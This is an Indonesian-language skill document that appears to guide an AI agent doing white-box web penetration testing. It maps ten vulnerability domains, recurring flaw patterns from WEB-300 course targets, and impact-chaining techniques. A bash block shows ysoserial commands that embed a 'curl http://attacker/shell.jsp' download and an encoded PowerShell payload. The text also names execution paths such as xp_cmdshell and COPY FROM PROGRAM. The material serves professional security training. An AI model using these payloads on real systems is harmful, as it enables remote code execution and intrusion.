---
name: "Capability Domains — Peta Kapabilitas White-Box Web Assessment"
description: "Taksonomi sepuluh domain kapabilitas konsultan white-box web assessment — dari source review dan autentikasi hingga deserialization, prototype pollution, SSRF/XXE, perantai dampak, exploit engineering, dan tooling — beserta pola yang berulang di aplikasi nyata dan bukti khasnya."
tags: [capability-map, domains, source-review, authentication, injection, deserialization, prototype-pollution, ssrf, xxe, exploit-development]
---

# Capability Domains — Peta Kapabilitas White-Box Web Assessment

Sepuluh domain di bawah adalah peta kemampuan yang melekat pada persona ini. Ini bukan silabus yang dihafal, melainkan daftar "kalau masalahnya di sini, ini yang saya kuasai dan ini buktinya".

## 1. Peta domain

| # | Domain | Kapabilitas inti | Bukti khas |
|---|---|---|---|
| 1 | Source review & data flow | pemetaan route, trace input → sink, review konfigurasi, penilaian kandidat | route map, catatan `file:line`, daftar kandidat yang gugur |
| 2 | Autentikasi & otorisasi | type juggling, magic hash, token lemah, logic flaw reset password, JWT, session | request bypass, skrip reset token, analisis `strcmp`/`in_array` |
| 3 | Injection | SQLi blind/OOB, ORM/HQL, command injection, WebSocket, header | pembuktian time-based/OOB, ekstraksi data, eksekusi perintah |
| 4 | Template injection | deteksi per engine, escape ke RCE, konteks sandbox | payload SSTI, output perintah, lokasi template |
| 5 | Deserialization | serializer .NET/Java/PHP, gadget chain, kunci enkripsi, `TypeNameHandling` | payload ysoserial, cookie/token yang di-forge |
| 6 | Prototype pollution | merge recursive, `__proto__`, gadget server-side, DOM XSS | respons terpolusi, eksekusi gadget, perubahan DOM |
| 7 | SSRF & XXE | bypass filter, metadata cloud, blind OOB, DTD, entity | callback OOB, isi berkas, respons metadata |
| 8 | Perantai dampak | cloud metadata, fitur database, CORS/CSRF, WebSocket, internal API | rantai utuh dari input ke akses istimewa |
| 9 | Exploit engineering | struktur script, session handling, retry/idempotensi, output | exploit.py yang jalan dari nol, log run bersih |
| 10 | Tooling & evidence | Burp, decompiler, ysoserial, pengambilan bukti | arsip request/response, artefak exploit, catatan redaksi |

## 2. Pola yang berulang di aplikasi nyata

Pola di bawah berasal dari studi kasus kursus WEB-300; detail versi dan CVE tetap harus diverifikasi ke advisory resmi sebelum dikutip ke klien.

| Aplikasi | Pola yang berulang |
|---|---|
| ATutor (PHP) | blind SQLi + salah pakai parameterization, bypass file upload, escape jail, disclosure web root; type juggling lewat magic hash pada email |
| ManageEngine (Java) | input tanpa sanitasi ke query; PostgreSQL `COPY ... TO PROGRAM`, extension UDF, dan large object mengubah SQLi menjadi RCE |
| Bassmaster (Node.js) | input request langsung masuk `eval()`; pola yang sama muncul kini sebagai sandbox escape dan template injection |
| DotNetNuke (C#) | root type dipilih dari input → `XmlSerializer` + `ExpandedWrapper<T1,T2>` + `ObjectDataProvider`; `LosFormatter`/`ObjectStateFormatter` sebagai inner payload |
| ERPNext (Python/Frappe) | SQLi di alur reset password (bukan sekadar logic flaw); Jinja2 SSTI di email, print, dan report template dengan filter evasion |
| openCRX (Java) | reset token dari RNG lemah; XXE → kredensial → Java routine (HSQLDB/H2) → web shell |
| openIT COCKPIT (PHP) | DOM-based XSS → WebSocket command injection |
| Reflected XSS (umum) | parameter/header/path/cookie yang di-echo tanpa context-aware encoding → eksekusi di origin korban; sering di halaman pencarian, error 404, dan dashboard admin yang merender UA/Referer |
| Concord (Java) | CORS permisif + CSRF, lalu insecure defaults; bukan JWT |
| Guacamole Lite (Node.js) | recursive merge pada JSON → `__proto__` pollution → gadget EJS/Handlebars |

## 3. Perantai dampak

Kemampuan yang membedakan konsultan white-box adalah menyambung kelas kerentanan menjadi satu jalur yang bisa dijelaskan:

- **SSRF lanjutan** — deteksi blind via out-of-band (Burp Collaborator, interactsh), DNS rebinding sebagai TOCTOU, protokol smuggling (`gopher`, `dict`, `file`, `ftp`), metadata cloud.
- **CORS + CSRF + RCE** — `Access-Control-Allow-Origin: *` dengan credentials, token CSRF yang disimpan di cookie dan tidak terikat sesi, lalu rantai: baca API → ubah password admin → login → RCE.
- **Database sebagai jalur eksekusi** — `COPY ... FROM PROGRAM` (PostgreSQL), `CREATE ALIAS` (H2), UDF (MySQL), `xp_cmdshell` (MSSQL).
- **Kanal non-HTTP** — WebSocket, job queue, webhook, dan endpoint internal yang tidak dijangkau scanner.

## 4. Alat dan perannya

| Alat | Peran dalam pekerjaan |
|---|---|
| Burp Suite Community | proxy, Repeater untuk verifikasi manual, Decoder; Intruder untuk uji terbatas |
| dnSpy | decompile dan debug assembly .NET; breakpoint pada method yang menerima input |
| JD-GUI / Jadx | decompile `.class`/`.jar`; cari `Runtime.exec`, `executeQuery`, `ObjectInputStream` |
| ysoserial / ysoserial.net | generate gadget chain Java dan .NET sesuai serializer target |
| Python 3 | `requests`, `websocket-client`; script exploit dan ekstraksi data |

```bash
# Java
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker/shell.jsp'

# .NET
mono ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "powershell -enc BASE64"
```

Alat otomatis seperti scanner SQLi, scanner Burp, source analyzer, dan chatbot berguna untuk **triage awal**, tetapi outputnya bukan bukti: temuan harus bisa dijelaskan sebagai rantai dan dijalankan ulang sebagai script. Gadget chain juga bergantung pada versi runtime — cocokkan dulu sebelum generate payload.

## 5. Batas dengan skill lain

| Kebutuhan | Skill yang memegang |
|---|---|
| Recon black-box, inventaris JS, pemetaan endpoint tanpa source | [web-reconnaissance](../../web-reconnaissance/SKILL.md) |
| Katalog payload per kelas kerentanan | [web-pentest-payloads](../../web-pentest-payloads/SKILL.md) |
| Penilaian black-box bertahap satu aplikasi | [web-app-scan](../../web-app-scan/SKILL.md) |
| Fase engagement dan pelaporan umum | [ptes-standard](../../ptes-standard/SKILL.md) |
| Audit kode berlapis pada codebase besar | [code-security-audit](../../code-security-audit/SKILL.md) |

## 6. Cara memakai peta ini

1. **Saat menerima aplikasi** — petakan ke satu atau dua domain; jangan memaksakan semua domain relevan.
2. **Saat memilih jalur** — tanyakan rantai mana yang paling pendek menuju dampak yang bisa dibuktikan.
3. **Saat melapor** — sebut domain, keputusan, dan buktinya; bukan nama alat.
4. **Saat menilai diri** — domain tanpa bukti nyata adalah domain yang belum dikuasai.

## 7. Best Practices

- Pilih domain berdasarkan akar masalah, bukan berdasarkan alat yang paling nyaman.
- Satu rantai utuh lebih bernilai daripada lima bug terisolasi.
- Simpan bukti per domain; itu bahan laporan sekaligus bahan retest.
- Domain 5, 7, dan 8 sering membutuhkan izin tambahan sebelum diuji (upload, akses metadata, perubahan data).
